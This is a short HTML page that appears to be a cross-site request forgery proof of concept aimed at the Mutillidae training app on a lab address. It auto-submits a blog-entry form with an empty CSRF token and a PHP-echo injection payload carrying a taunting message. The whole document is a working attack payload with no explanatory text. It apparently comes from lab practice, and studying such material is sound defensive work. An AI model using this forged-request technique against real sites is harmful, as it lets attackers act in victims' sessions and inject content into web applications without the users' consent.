<html>
<head>
</head>
<body onload="document.getElementById('idBlogForm').submit()">
<form id="idBlogForm" action="http://192.168.10.130/mutillidae/index.php?page=add-to-your-blog.php" method="post">
<input name="csrf-token" value="" type="hidden"/>
<textarea name="blog_entry" HTMLandXSSandSQLInjectionPoint="1" rows="8" cols="65" autofocus="1"><?php echo "Hey,YouAreHackedIdiot!"; ?></textarea>
<input name="add-to-your-blog-php-submit-button" XSRFVulnerabilityArea="1" value="Save Blog Entry" type="hidden"/>
</form>
</body>
</html>